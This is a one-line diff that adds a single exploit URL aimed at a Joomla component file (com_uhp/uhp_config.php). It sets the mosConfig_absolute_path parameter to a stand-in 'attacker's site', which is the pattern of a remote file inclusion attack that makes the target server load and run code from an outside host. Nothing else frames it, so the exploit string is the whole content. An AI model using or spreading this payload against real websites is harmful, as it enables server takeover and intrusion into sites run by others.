@@ -1,0 +1,1 @@
+http://www.example.com/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=attacker's site
